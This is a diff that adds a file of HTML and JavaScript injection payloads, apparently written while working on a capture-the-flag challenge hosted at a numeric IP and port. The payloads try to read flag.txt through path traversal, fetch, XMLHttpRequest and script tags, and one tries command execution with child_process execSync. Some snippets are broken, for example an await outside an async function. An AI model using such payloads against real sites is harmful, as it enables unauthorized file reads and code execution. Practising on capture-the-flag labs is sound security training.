@@ -1,0 +1,38 @@
+<script>
+    jQuery.get('http://159.65.81.51:31241/../../../flag.txt', function(data) {
+        alert(data);
+    });
+    </script>
+    
+    <script>
+        fetch('http://159.65.81.51:31241/flag.txt')
+        .then(response => response.text())
+        .then((data) => {
+            console.log(data)
+        });
+    </script>
+    
+    <script src="../flag.txt"></script>
+    <script>console.log(text);</script>
+    
+    <a href="../../flag.txt"></a>
+    
+    <script>
+        const response = await fetch('http://159.65.81.51:31241/flag.txt');
+        const data = await response.text();
+        console.log(data);
+    </script>
+    
+    <script>
+        const execSync = require('child_process').execSync;
+        const output = execSync('ls', { encoding: 'utf-8' });
+        console.log('Output was:\n', output);
+    </script>
+    
+    <link rel='' href="flag.txt">
+    
+    <script>
+        const request = new XMLHttpRequest();
+        request.open('GET', 'flag.txt');
+        request.send();
+    </script>
